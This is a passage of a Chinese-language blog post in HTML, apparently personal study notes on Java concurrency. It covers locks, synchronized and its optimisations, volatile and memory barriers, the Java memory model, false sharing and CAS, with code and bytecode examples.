class="string">&quot;success&quot;</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> i;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Thread</span>(()-&gt;&#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;收集&quot;</span>+temp+<span class="string">&quot;个龙珠&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 等到7个然后执行success</span></span><br><span class="line">                    success.await();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (BrokenBarrierException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Semaphore-类"><a href="#Semaphore-类" class="headerlink" title="Semaphore(类)"></a>Semaphore(类)</h3><p>底层CAS</p>
<h3 id="ReadWriteLock-接口"><a href="#ReadWriteLock-接口" class="headerlink" title="ReadWriteLock(接口)"></a>ReadWriteLock(接口)</h3><p>读可以多线程同时读，写只能一个写;读锁是为了防止读的时候有线程写入; ReentrantReadWriteLock()默认读优先，对写不公平;</p>
<h3 id="BlockingQueue-接口"><a href="#BlockingQueue-接口" class="headerlink" title="BlockingQueue(接口)"></a>BlockingQueue(接口)</h3><p>多线程，线程池会使用; </p>
<p>add() 可能报IllegalStateException异常， remove() 可能报NoSuchElementException异常，有返回值抛异常; </p>
<p>offer()， poll()有返回值，不抛异常 ， offer(d， 2，TimeUnit.SECONDS)， poll(2， TImeUnit.SECONDS) 可以设置等待时间;</p>
<p> element() peek()返回队首元素; </p>
<p> put()， take() 会等待，直到能操作成功;  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span> &#123;</span><br><span class="line">        ArrayBlockingQueue&lt;Object&gt; objects = <span class="keyword">new</span> <span class="title class_">ArrayBlockingQueue</span>&lt;&gt;(<span class="number">3</span>);</span><br><span class="line">        System.out.println(objects.add(<span class="string">&quot;a&quot;</span>));</span><br><span class="line">        System.out.println(objects.add(<span class="string">&quot;a&quot;</span>));</span><br><span class="line">        System.out.println(objects.add(<span class="string">&quot;a&quot;</span>));</span><br><span class="line">        System.out.println(objects.add(<span class="string">&quot;a&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//java.lang.IllegalStateException: Queue full</span></span><br><span class="line"><span class="comment">//java.util.NoSuchElementException</span></span><br></pre></td></tr></table></figure>

<h3 id="SynchronizedQueue-类"><a href="#SynchronizedQueue-类" class="headerlink" title="SynchronizedQueue(类)"></a>SynchronizedQueue(类)</h3><p>没有容量， 进去一个元素， 必须等待取出来之后，才能再往里面放一个元素; put() take(); </p>
<h2 id="Synchronized"><a href="#Synchronized" class="headerlink" title="Synchronized"></a>Synchronized</h2><p><a href="https://blog.csdn.net/u012403290/article/details/64910926">https://blog.csdn.net/u012403290/article/details/64910926</a></p>
<p>必须可重入，例如子类重写父类方法，都加了synchronized，这个时候子类方法里会调用super（）方法，如果不可重入就会死锁；最好不要锁string字符串；</p>
<p>jdk早期版本属于重量级锁; 可重入锁;JVM层面; 非公平锁; 内置关键字，隐形锁;线程异常时自动释放锁，不会发生死锁; 非中断锁，必须等线程执行完才释放锁; 代码块同步: 通过使用monitorenter和monitorexit指令实现的; 同步方法: ACC_SYNCHRONIZED修饰;有对象锁和类锁（static方法和class上枷锁）区分，两者不冲突可以并行存在; </p>
<p>synchronized关键字与wait()和notify()&#x2F;notifyAll()方法相结合可以实现等待&#x2F;通知机制;</p>
<p> wait()和notify()只能在同步代码块中使用;</p>
<p>监视器锁（monitor）是依赖于底层的操作系统的 Mutex Lock 来实现的，Java 的线程是映射到操作系统的原生线程之上的。如果要挂起或者唤醒一个线程，都需要操作系统帮忙完成，而操作系统实现线程之间的切换时需要从用户态转换到内核态，这个状态之间的转换需要相对比较长的时间，时间成本相对较高。庆幸的是在 Java 6 之后 Java 官方对从 JVM 层面对 synchronized 较大优化，所以现在的 synchronized 锁效率也优化得很不错了.</p>
<h3 id="深入分析wait-x2F-notify为什么要在同步块内"><a href="#深入分析wait-x2F-notify为什么要在同步块内" class="headerlink" title="深入分析wait&#x2F;notify为什么要在同步块内"></a>深入分析wait&#x2F;notify为什么要在同步块内</h3><p><a href="https://blog.csdn.net/lsgqjh/article/details/61915074">https://blog.csdn.net/lsgqjh/article/details/61915074</a></p>
<p>notify不释放锁，得让你自己wait释放锁，才能notify</p>
<p>Java API 强制要求这样做，如果你不这么做，你的代码会抛出IllegalMonitorStateException 异常。还有一个原因是为了避免 wait 和 notify之间产生竞态条件，生产者线程向缓冲区中写入数据，消费者线程从缓冲区中读取数据。消费者线程需要等待直到生产者线程完成一次写入操作。</p>
<p>生产者线程需要等待消费者线程完成一次读取操作。假设wait()，notify()，notifyAll()方法不需要加锁就能够被调用。此时消费者线程调用wait()正在进入状态变量的等待队列(译者注:可能还未进入)。在同一时刻，生产者线程调用notify()方法打算向消费者线程通知状态改变。那么此时消费者线程将错过这个通知并一直阻塞。因此，对象的wait()，notify()，notifyAll()方法必须在该对象的同步方法或同步代码块中被互斥地调用。</p>
<h3 id="虚假唤醒问题"><a href="#虚假唤醒问题" class="headerlink" title="虚假唤醒问题"></a>虚假唤醒问题</h3><p>当一个条件满足时，很多线程都被唤醒了，但是只有其中部分是有用的唤醒，其它的唤醒都是无用功；<br>比如买货：如果商品本来没有货物，突然进了一件商品，这是所有的线程都被唤醒了，但是只能一个人买，所以其他人都是假唤醒，获取不到对象的锁；</p>
<h4 id="虚假唤醒是如何产生的？"><a href="#虚假唤醒是如何产生的？" class="headerlink" title="虚假唤醒是如何产生的？"></a>虚假唤醒是如何产生的？</h4><p>　　把 while (number !&#x3D; 0) {}</p>
<p>　　换成 if (number &#x3D;&#x3D; 0) {}</p>
<p>　　就会出现虚假唤醒。官方文档有标注；</p>
<h4 id="为什么if判断会出现虚假唤醒？"><a href="#为什么if判断会出现虚假唤醒？" class="headerlink" title="为什么if判断会出现虚假唤醒？"></a>为什么if判断会出现虚假唤醒？</h4><p>  　　1. 因为if只会执行一次，执行完会接着向下执行if（）外边的</p>
<pre><code>    　　2. 而while不会，直到条件满足才会向下执行while（）外边的
</code></pre>
<h3 id="8锁现象-关于锁的8个问题"><a href="#8锁现象-关于锁的8个问题" class="headerlink" title="8锁现象(关于锁的8个问题)"></a>8锁现象(关于锁的8个问题)</h3><h3 id="synchronized优化"><a href="#synchronized优化" class="headerlink" title="synchronized优化"></a>synchronized优化</h3><p>锁的四种状态: 无锁状态，偏向锁状态，轻量级锁状态，重量级锁;锁可以升级，但不能降级;</p>
<p>偏向锁是针对于一个线程而言的， 线程获得锁之后就不会再有解锁等操作了，假如有两个线程来竞争该锁的话， 那么偏向锁就失效了， 进而升级成轻量级锁了.因为大部分情况下， 都会是同一个线程进入同一块同步代码块的. 这也是为什么会有偏向锁出现的原因.在Jdk1.6中， 偏向锁的开关是默认开启的， 适用于只有一个线程访问同步块的场景. -XX:BiasedLockingStartupDelay&#x3D;0来关闭偏向锁的启动延迟， 也可以使用-XX:-UseBiasedLocking&#x3D;false来关闭偏向锁， 那么程序会直接进入轻量级锁状态.</p>
<p>轻量级锁: CAS思想;竞争的线程不会阻塞， 提高了程序的响应速度;如果始终得不到锁竞争的线程， 使用自旋会消耗CPU;</p>
<p>重量级锁: 线程竞争不适用自旋， 不会消耗CPU;线程堵塞， 响应时间缓慢</p>
<h4 id="锁消除"><a href="#锁消除" class="headerlink" title="锁消除"></a>锁消除</h4><p>锁消除是指对于被检测出不可能存在竞争的共享数据的锁进行消除。<br>锁消除主要是通过逃逸分析来支持，如果堆上的共享数据不可能逃逸出去被其它线程访问到，那么就可以把它们当成私有数据对待，也就可以将它们的锁进行消除。对于一些看起来没有加锁的代码，其实隐式的加了很多锁。例如下面的字符串拼接代码就隐式加了锁：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">concatString</span><span class="params">(String s1， String s2， String s3)</span> &#123; </span><br><span class="line">    <span class="keyword">return</span> s1 + s2 + s3; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// String 是一个不可变的类，编译器会对 String 的拼接自动优化。在 JDK 1.5 之前，会转化为 StringBuffer 对象的连续 append() 操作：</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">concatString</span><span class="params">(String s1， String s2， String s3)</span> &#123; </span><br><span class="line">    <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(); </span><br><span class="line">    sb.append(s1); </span><br><span class="line">    sb.append(s2); </span><br><span class="line">    sb.append(s3); </span><br><span class="line">    <span class="keyword">return</span> sb.toString(); </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 每个 append() 方法中都有一个同步块。虚拟机观察变量 sb，很快就会发现它的动态作用域被限制在 concatString() 方法内部。也就是说，sb 的所有引用永远不会逃逸到 concatString() 方法之外，其他线程无法访问到它，因此可以进行消除。</span></span><br></pre></td></tr></table></figure>

<h4 id="锁粗化"><a href="#锁粗化" class="headerlink" title="锁粗化"></a>锁粗化</h4><p>如果一系列的连续操作都对同一个对象反复加锁和解锁，频繁的加锁操作就会导致性能损耗。<br>上一节的示例代码中连续的 append() 方法就属于这类情况。如果虚拟机探测到由这样的一串零碎的操作都对同一个对象加锁，将会把加锁的范围扩展（粗化）到整个操作序列的外部。对于上一节的示例代码就是扩展到第一个 append() 操作之前直至最后一个 append() 操作之后，这样只需要加锁一次就可以了。</p>
<h2 id="Lock"><a href="#Lock" class="headerlink" title="Lock"></a>Lock</h2><p>conditon代替对象监视器; await ， signal，只能在同步代码块中使用;</p>
<h2 id="ReentrantLock"><a href="#ReentrantLock" class="headerlink" title="ReentrantLock"></a>ReentrantLock</h2><p>显性锁，可重入锁; JDK 层面实现的（也就是 API 层面，需要 lock() 和 unlock() 方法配合 try&#x2F;finally 语句块来完成); 等待可中断; 可实现公平锁(默认是非公平的); 底层是CAS乐观锁，依赖AbstractQueuedSynchronizer类，把所有的请求线程构成一个CLH队列。而对该队列的操作均通过Lock-Free（CAS）操作; 适合锁大量的代码块;</p>
<h2 id="可重入锁、读写锁、公平锁、可中断锁"><a href="#可重入锁、读写锁、公平锁、可中断锁" class="headerlink" title="可重入锁、读写锁、公平锁、可中断锁"></a>可重入锁、读写锁、公平锁、可中断锁</h2><h5 id="可重入锁"><a href="#可重入锁" class="headerlink" title="可重入锁"></a>可重入锁</h5><p>Synchronized和ReentrantLook都是可重入锁，锁的可重入性标明了锁是针对线程分配方式而不是针对方法。例如调用Synchronized方法A中可以调用Synchronized方法B，而不需要重新申请锁。</p>
<h5 id="读写锁"><a href="#读写锁" class="headerlink" title="读写锁"></a>读写锁</h5><p>按照数据库事务隔离特性的类比读写锁，在访问统一个资源（一个文件）的时候，使用读锁来保证多线程可以同步读取资源。ReadWriteLock是一个读写锁，通过readLock()获取读锁，通过writeLock()获取写锁。</p>
<h5 id="可中断锁"><a href="#可中断锁" class="headerlink" title="可中断锁"></a>可中断锁</h5><p>可中断是指锁是可以被中断的，Synchronized内置锁是不可中断锁，ReentrantLock可以通过lockInterruptibly方法中断显性锁。例如线程B在等待等待线程A释放锁，但是线程B由于等待时间太久，可以主动中断等待锁。</p>
<h5 id="公平锁"><a href="#公平锁" class="headerlink" title="公平锁"></a>公平锁</h5><p>多个线程按照申请锁的顺序去获得锁，线程会直接进入队列去排队，永远都是队列的第一位才能得到锁。synchronized隐性锁是非公平锁，它无法保证等待的线程获取锁的顺序，ReentrantLook可以自己控制是否公平锁。公平锁先来后到，对短任务不友好，所以默认非公平锁，可以插队; </p>
<p>优点：所有的线程都能得到资源，不会饿死在队列中。</p>
<p>缺点：吞吐量会下降很多，队列里面除了第一个线程，其他的线程都会阻塞，cpu唤醒阻塞线程的开销会很大， 对短任务不友好;</p>
<h5 id="非公平锁"><a href="#非公平锁" class="headerlink" title="非公平锁"></a>非公平锁</h5><p>多个线程去获取锁的时候， 会直接去尝试获取，获取不到，再去进入到等待队列， 如果能获取到， 就直接获取到锁.</p>
<p>优点:  可以减少CPU唤醒线程的开销， 整体的吞吐效率会高点， CPU也不必唤醒所有线程， 会减少唤起线程的数量;</p>
<p>缺点:  容易饿死， 可能会导致线程中间的线程一直获取不到锁或者长时间获取不到锁，导致饿死.这么多个线程应cas去尝试会浪费cpu;</p>
<h2 id="Synchronized和Lock比较"><a href="#Synchronized和Lock比较" class="headerlink" title="Synchronized和Lock比较"></a>Synchronized和Lock比较</h2><ul>
<li>Synchronized是关键字，内置语言实现，Lock是接口。</li>
<li>Synchronized在线程发生异常时会自动释放锁，因此不会发生异常死锁。Lock异常时不会自动释放锁，所以需要在finally中实现释放锁。</li>
<li>Lock是可以中断锁，Synchronized是非中断锁，必须等待线程执行完成释放锁。</li>
<li>Lock可以使用读锁提高多线程读效率。</li>
</ul>
<h2 id="volatile"><a href="#volatile" class="headerlink" title="volatile"></a>volatile</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848702.png" alt="image-20210605202825290"></p>
<p><a href="https://www.cnblogs.com/yaowen/p/11240540.html">https://www.cnblogs.com/yaowen/p/11240540.html</a></p>
<p> 可见性，不保证原子性，禁止指令重排;</p>
<p>指令重排: 源代码- 编译器优化重排-指令并行也可能会重排-内存系统也会重排-执行; 在DCL单例模式用的多;</p>
<p>volatile作用：</p>
<p>1.锁总线，其它CPU对内存的读写请求都会被阻塞，直到锁释放，不过实际后来的处理器都采用锁缓存替代锁总线，因为锁总线的开销比较大，锁总线期间其他CPU没法访问内存</p>
<p>2.lock后的写操作会回写已修改的数据，同时让其它CPU相关缓存行失效，从而重新从主存中加载最新的数据</p>
<p>3.<strong>不是内存屏障却能完成类似内存屏障的功能，阻止屏障两遍的指令重排序</strong></p>
<p>被volatile修饰的变量在编译成字节码文件时会多个lock指令，该指令在执行过程中会生成相应的<strong>内存屏障</strong>，以此来解决可见性跟重排序的问题。</p>
<p>内存屏障的作用：<br>1.在有内存屏障的地方，会禁止指令重排序，即屏障下面的代码不能跟屏障上面的代码交换执行顺序。<br>2.在有内存屏障的地方，线程修改完共享变量以后会马上把该变量从本地内存写回到主内存，<strong>并且让其他线程本地内存中该变量副本失效（使用MESI协议）</strong></p>
<p>JSR内存屏障可以被分为以下几种类型(JVM的要求， 具体hotpsot使用lock机制来实现)<br><strong>LoadLoad屏障：</strong>对于这样的语句Load1; LoadLoad; Load2，在Load2及后续读取操作要读取的数据被访问前，保证Load1要读取的数据被读取完毕。<br><strong>StoreStore屏障：</strong>对于这样的语句Store1; StoreStore; Store2，在Store2及后续写入操作执行前，保证Store1的写入操作对其它处理器可见。<br><strong>LoadStore屏障：</strong>对于这样的语句Load1; LoadStore; Store2，在Store2及后续写入操作被刷出前，保证Load1要读取的数据被读取完毕。<br><strong>StoreLoad屏障：</strong>对于这样的语句Store1; StoreLoad; Load2，在Load2及后续所有读取操作执行前，保证Store1的写入对所有处理器可见。它的开销是四种屏障中最大的。     在大多数处理器的实现中，这个屏障是个万能屏障，兼具其它三种内存屏障的功能。</p>
<p>为了实现volatile的内存语义，编译器在生成字节码时，会在指令序列中插入内存屏障来禁止特定类型的处理器重排序。对于编译器来说，发现一个最优布置来最小化插入屏障的总数几乎不可能，为此，JMM采取保守策略。下面是基于保守策略的JMM内存屏障插入策略：</p>
<ol>
<li>在每个volatile写操作的前面插入一个StoreStore屏障。</li>
<li>在每个volatile写操作的后面插入一个StoreLoad屏障。</li>
<li>在每个volatile读操作的后面插入一个LoadLoad屏障。</li>
<li>在每个volatile读操作的后面插入一个LoadStore屏障。</li>
</ol>
<p>上述内存屏障插入策略非常保守，但它可以保证在任意处理器平台，任意的程序中都能得到正确的volatile内存语义。</p>
<p>volatile关键字修饰的变量会存在一个lock:的前缀; </p>
<p>Lock前缀，lock不是一种内存屏障，但是它能完成内存屏障的功能. lock会对CPU总线和高速缓存行加锁，可以理解为CPU指令级的锁. 类似于lock指令. 在具体执行上， 它先对总线和缓存加锁，然后执行后面的指令， 在lock锁住总线的时候，其他cpu读写请求都会被阻塞， 直到锁被释放. 最后释放锁后会把高速缓存中的脏数据全部刷新回主内存， 且这个写回内存的操作会使在其他cpu里缓存了该地址的数据无效.</p>
<p>当线程b发现对应地址的缓存行被锁了，等待锁的释放， 缓存一致性协议会保证它读取到最新的值(重新从主存中读取， 因为有总线锁，如果线程a还没写回，b无法读取内存的东西，总线被锁住了) </p>
<p> volatile是“轻量级”synchronized，保证了共享变量的“可见性”（JMM确保所有线程看到这个变量的值是一致的），当CPU写数据时，如果发现操作的变量是共享变量，即在其他CPU中也存在该变量的副本，会发出信号通知其他CPU将该变量的缓存行置为无效状态并且锁住缓存行，因此当其他CPU需要读取这个变量时，要等锁释放，并发现自己缓存行是无效的，那么它就会从内存重新读取。</p>
<p> volatile是“轻量级”synchronized，保证了共享变量的“可见性”（JMM确保所有线程看到这个变量的值是一致的），使用和执行成本比synchronized低，因为它不会引起线程上下文切换和调度。</p>
<hr>
<p>工作内存Work Memory其实就是对CPU寄存器和高速缓存的抽象，或者说每个线程的工作内存也可以简单理解为CPU寄存器和高速缓存。</p>
<h3 id="volatile无法保证共享变量i-线程安全原因-JVM字节码层面"><a href="#volatile无法保证共享变量i-线程安全原因-JVM字节码层面" class="headerlink" title="volatile无法保证共享变量i++线程安全原因(JVM字节码层面)"></a>volatile无法保证共享变量i++线程安全原因(JVM字节码层面)</h3><p>volatile是为了解决JMM带来的变量可见性问题。</p>
<p>如果共享变量i++也和局部变量i++的执行流程相同：直接将局部变量中i值自增加1，那么volatile不就能保证多线程数据安全了？众所周知，volatile无法保证原子性，它只保证可见性。来看看JVM的具体实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">volatile</span> <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;<span class="comment">//行数2</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        i++;<span class="comment">//行数4</span></span><br><span class="line">    &#125;<span class="comment">//行数5</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Compiled from <span class="string">&quot;Demo.java&quot;</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(java.lang.String[])</span>;</span><br><span class="line">    Code:</span><br><span class="line">       <span class="number">0</span>: getstatic     #<span class="number">2</span>   <span class="comment">// Field i:I    //获取静态共享变量i的值放入操作数栈顶</span></span><br><span class="line">       <span class="number">3</span>: iconst_1                           <span class="comment">//将整数1推到栈顶</span></span><br><span class="line">       <span class="number">4</span>: iadd                               <span class="comment">//将栈顶两int值相加并将结果压入栈顶</span></span><br><span class="line">       <span class="number">5</span>: putstatic     #<span class="number">2</span>   <span class="comment">// Field i:I    //将栈顶的值同步回主存</span></span><br><span class="line">       <span class="number">8</span>: <span class="keyword">return</span></span><br><span class="line">    LineNumberTable:</span><br><span class="line">      line <span class="number">4</span>: <span class="number">0</span>    <span class="comment">//共享变量i++，包含了0、3、4、5的代码执行</span></span><br><span class="line">      line <span class="number">5</span>: <span class="number">8</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> &#123;&#125;;</span><br><span class="line">    Code:</span><br><span class="line">       <span class="number">0</span>: iconst_0</span><br><span class="line">       <span class="number">1</span>: putstatic     #<span class="number">2</span>   <span class="comment">// Field i:I</span></span><br><span class="line">       <span class="number">4</span>: <span class="keyword">return</span></span><br><span class="line">    LineNumberTable:</span><br><span class="line">      line <span class="number">2</span>: <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>总结：static共享变量i++：分3步，一.获取变量i的值，二.值加1，三.加1后的值写回i中。伪代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> i;</span><br><span class="line">temp = temp + <span class="number">1</span>;</span><br><span class="line">i = temp;</span><br></pre></td></tr></table></figure>

<p>很明显了，原因就是java共享变量的运算操作符不是原子操作！（字节码层面。其实不够严谨，因为就算编译出来只有一条字节码指令，JVM解释器也会运行多行代码解释执行或即时编译器也会编译成多行本地机器码执行，使用 -XX:+PrintAssembly 参数输出反汇编来分析会更严谨些，但这里字节码层面已经足以说明问题）</p>
<p>多线程环境，假设A、B线程同时执行，都执行到了第二步，B线程先执行结束i&#x3D;1，因为变量i是volatile类型，所以B线程执行结束马上刷新工作线程中i&#x3D;1到主存，并且通知其它cpu中线程：主存中i的值更新了，使A工作线程中缓存的i失效。如果A线程这时候使用到变量i，就需要去主存重新copy一份副本到自己的工作内存。但是这时候A执行到了temp &#x3D; temp + 1，已经用临时变量temp记录了之前i的值，不需要再读取i的值了。所以，虽然变量i的值0在A的工作内存中确实失效了，但是值temp仍然是有效的，既然有效，A就会将第三步的结果i&#x3D;1再次写入主存，覆盖了之前B线程写入的值。这就是为什么volatile无法保证共享变量i++线程安全的原因。简单讲就是volatile关键字只保证了 “0: getstatic” 获取到的是主存中最新的值，不保证 “4: iadd” 执行时操作栈中的值是主存最新的。</p>
<p>其实，这些都是JMM Java内存模型带来的数据问题：可见性、有序性、原子性。volatile是JDK提供的解决JMM数据可见性的关键字（volatile还保证了有序性），JVM实现volatile内存可见性语义，上面反汇编得到的代码就是JVM的具体实现流程。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203170824569.png" alt="image-20220317082451317"></p>
<p>new 申请内存，4 调用构造方法赋初始值。 如果4、7互换的话就会有问题，先把内存地址放回去，再赋值。这样就会导致有些线程拿到半初始化的对象。</p>
<h3 id="JMM"><a href="#JMM" class="headerlink" title="JMM"></a>JMM</h3><p>java内存模型主要定义了各种变量的访问规则;</p>
<p>Java内存模型（Java Memory Model ，JMM）(指JDK5的新模型)就是一种符合内存模型规范的，屏蔽了各种硬件和操作系统的访问差异的，保证了Java程序在各种平台下对内存的访问都能保证效果一致的机制及规范。</p>
<p>Java内存模型规定了所有的变量都存储在主内存中，每条线程还有自己的工作内存，线程的工作内存中保存了该线程中是用到的变量的主内存副本拷贝，线程对变量的所有操作都必须在工作内存中进行，而不能直接读写主内存。不同的线程之间也无法直接访问对方工作内存中的变量，线程间变量的传递均需要自己的工作内存和主存之间进行数据同步进行。而JMM就作用于工作内存和主存之间数据同步过程。他规定了如何做数据同步以及什么时候做数据同步。<strong>JMM是一种规范，目的是解决由于多线程通过共享内存进行通信时，存在的本地内存数据不一致、编译器会对代码指令重排序、处理器会对代码乱序执行等带来的问题。</strong></p>
<p>在开发多线程的代码的时候，我们可以直接使用synchronized等关键字来控制并发，从来就不需要关心底层的编译器优化、缓存一致性等问题。所以，Java内存模型，除了定义了一套规范，还提供了一系列原语，封装了底层实现后，供开发者直接使用。</p>
<p>Jdk1.2之前，都是从主存中读取变量; 而在当前的 Java 内存模型下，线程可以把变量保存<strong>本地内存</strong>（比如机器的寄存器）中，而不是直接在主存中进行读写。这就可能造成一个线程在主存中修改了一个变量的值，而另外一个线程还继续使用它在寄存器中的变量值的拷贝，造成<strong>数据的不一致</strong>。</p>
<img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848717.png" alt="JMM(Java内存模型)" style="zoom:50%;" />

<p>volatile指示JVM这个变量是共享且不稳定的，每次使用它都到主存中去读取; 防止指令重排;保证变量的可见性;</p>
<img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848004.png" alt="volatile关键字的可见性" style="zoom:50%;" />

<p>同步约定: 线程解锁前，必须把共享变量立刻刷回主存; 线程加锁前， 必须读取主存中的最新的值到工作内存中; 加锁和解锁是同一把锁; </p>
<p>8种操作</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848038.png" alt="image-20210427084129374"></p>
<p>8种操作如下：</p>
<ul>
<li>lock(锁定)：作用于主内存，它把一个变量标记为一条线程独占状态；</li>
<li>read(读取)：作用于主内存，它把变量值从主内存传送到线程的工作内存中，以便随后的load动作使用；</li>
<li>load(载入)：作用于工作内存，它把read操作的值放入工作内存中的变量副本中；</li>
<li>use(使用)：作用于工作内存，它把工作内存中的值传递给执行引擎，每当虚拟机遇到一个需要使用这个变量的指令时候，将会执行这个动作；</li>
<li>assign(赋值)：作用于工作内存，它把从执行引擎获取的值赋值给工作内存中的变量，每当虚拟机遇到一个给变量赋值的指令时候，执行该操作；</li>
<li>store(存储)：作用于工作内存，它把工作内存中的一个变量传送给主内存中，以备随后的write操作使用；</li>
<li>write(写入)：作用于主内存，它把store传送值放到主内存中的变量中。</li>
<li>unlock(解锁)：作用于主内存，它将一个处于锁定状态的变量释放出来，释放后的变量才能够被其他线程锁定；</li>
</ul>
<p>Java内存模型还规定了执行上述8种基本操作时必须满足如下规则:</p>
<p>（1）不允许read和load、store和write操作之一单独出现（即不允许一个变量从主存读取了但是工作内存不接受，或者从工作内存发起会写了但是主存不接受的情况），以上两个操作必须按顺序执行，但没有保证必须连续执行，也就是说，read与load之间、store与write之间是可插入其他指令的。</p>
<p>（2）不允许一个线程丢弃它的最近的assign操作，即变量在工作内存中改变了之后必须把该变化同步回主内存。</p>
<p>（3）不允许一个线程无原因地（没有发生过任何assign操作）把数据从线程的工作内存同步回主内存中。</p>
<p>（4）一个新的变量只能从主内存中“诞生”，不允许在工作内存中直接使用一个未被初始化（load或assign）的变量，换句话说就是对一个变量实施use和store操作之前，必须先执行过了assign和load操作。</p>
<p>（5）一个变量在同一个时刻只允许一条线程对其执行lock操作，但lock操作可以被同一个条线程重复执行多次，多次执行lock后，只有执行相同次数的unlock操作，变量才会被解锁。</p>
<p>（6）如果对一个变量执行lock操作，将会清空工作内存中此变量的值，在执行引擎使用这个变量前，需要重新执行load或assign操作初始化变量的值。</p>
<p>（7）如果一个变量实现没有被lock操作锁定，则不允许对它执行unlock操作，也不允许去unlock一个被其他线程锁定的变量。</p>
<p>（8）对一个变量执行unlock操作之前，必须先把此变量同步回主内存（执行store和write操作）。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203170828921.png" alt="image-20220317082858813"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203170831463.png" alt="image-20220317083152370"></p>
<h4 id="缓存行对齐的问题-伪共享问题"><a href="#缓存行对齐的问题-伪共享问题" class="headerlink" title="缓存行对齐的问题 伪共享问题"></a>缓存行对齐的问题 伪共享问题</h4><p>一个cacheline 一般64字节。 </p>
<p>位于同一缓存行的两个不同数据，被两个不同CPU锁定，产生互相影响的伪共享问题。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203170846129.png" alt="image-20220317084654866"></p>
<p>disruptor 框架</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203170851968.png" alt="image-20220317085127676"></p>
<p>前后7个long，怎么都不会混在别的缓存行里面。</p>
<h3 id="并发编程的三个重要特性"><a href="#并发编程的三个重要特性" class="headerlink" title="并发编程的三个重要特性"></a>并发编程的三个重要特性</h3><p>原子性;可见性;有序性</p>
<h3 id="synchronized和volatile的区别"><a href="#synchronized和volatile的区别" class="headerlink" title="synchronized和volatile的区别"></a>synchronized和volatile的区别</h3><ul>
<li>volatile 关键字是线程同步的轻量级实现，所以volatile性能比synchronized关键字要好。但是volatile 关键字只能用于变量而 synchronized 关键字可以修饰方法以及代码块。</li>
<li>volatile 关键字能保证数据的可见性，但不能保证数据的原子性。synchronized 关键字两者都能保证。</li>
<li>volatile关键字主要用于解决变量在多个线程之间的可见性，而 synchronized 关键字解决的是多个线程之间访问资源的同步性。</li>
</ul>
<h2 id="CAS"><a href="#CAS" class="headerlink" title="CAS"></a>CAS</h2><p>Java无法操作内存，Java可以调用C++，C++可以操作内存；java可以通过unsafe类操作内存；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 读取传入对象o在内存中偏移量为offset位置的值与期望值expected作比较。相等就把x值赋值给offset位置的值。方法返回true。不相等，就取消赋值，方法返回false。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="type">boolean</span> <span class="title function_">compareAndSwapInt</span><span class="params">(Object o， <span class="type">long</span> offset，</span></span><br><span class="line"><span class="params">                                              <span class="type">int</span> expected，</span></span><br><span class="line"><span class="params">                                              <span class="type">int</span> x)</span>;</span><br></pre></td></tr></table></figure>

